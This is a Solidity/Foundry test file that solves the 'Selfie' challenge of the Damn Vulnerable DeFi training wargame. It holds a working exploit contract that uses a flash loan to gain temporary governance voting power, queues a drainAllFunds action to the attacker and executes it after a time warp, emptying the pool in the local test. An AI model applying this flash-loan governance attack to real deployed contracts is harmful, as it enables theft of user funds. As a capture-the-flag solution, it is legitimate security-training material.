// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";

contract FLR is Test {
    SelfiePool selfiePool;
    SimpleGovernance simpleGovernance;
    DamnValuableTokenSnapshot dvtSnapshot;
    address receiver;

    constructor(SelfiePool _selfiePool, SimpleGovernance _simpleGovernance, DamnValuableTokenSnapshot _dvtSnapshot) {
	selfiePool = _selfiePool;
	simpleGovernance = _simpleGovernance;
	dvtSnapshot = _dvtSnapshot;
	receiver = msg.sender;
    }

    function initiate(uint256 amount) external {
	selfiePool.flashLoan(amount);
    }

    function drain() external {
	simpleGovernance.executeAction(1);
    }

    function receiveTokens(address token, uint256 amount) external {
	emit log_named_uint("flashloaned", amount);
	emit log_named_uint("got", simpleGovernance.governanceToken().balanceOf(address(this)));

	dvtSnapshot.snapshot(); // avoid snapshot to be 0

	simpleGovernance.queueAction(address(selfiePool), abi.encodeWithSignature("drainAllFunds(address)", receiver), 0);

	dvtSnapshot.transfer(address(selfiePool), amount);
    }
}

contract Selfie is Test {
    uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;

    Utilities internal utils;
    SimpleGovernance internal simpleGovernance;
    SelfiePool internal selfiePool;
    DamnValuableTokenSnapshot internal dvtSnapshot;
    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];

        vm.label(attacker, "Attacker");

        dvtSnapshot = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        vm.label(address(dvtSnapshot), "DVT");

        simpleGovernance = new SimpleGovernance(address(dvtSnapshot));
        vm.label(address(simpleGovernance), "Simple Governance");

        selfiePool = new SelfiePool(
            address(dvtSnapshot),
            address(simpleGovernance)
        );

        dvtSnapshot.transfer(address(selfiePool), TOKENS_IN_POOL);

        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), TOKENS_IN_POOL);

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/
	vm.startPrank(attacker);

	FLR flr = new FLR(selfiePool, simpleGovernance, dvtSnapshot);
	flr.initiate(TOKENS_IN_POOL);
	vm.warp(block.timestamp + 2 days);
	flr.drain();

	vm.stopPrank();
        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
    }
}
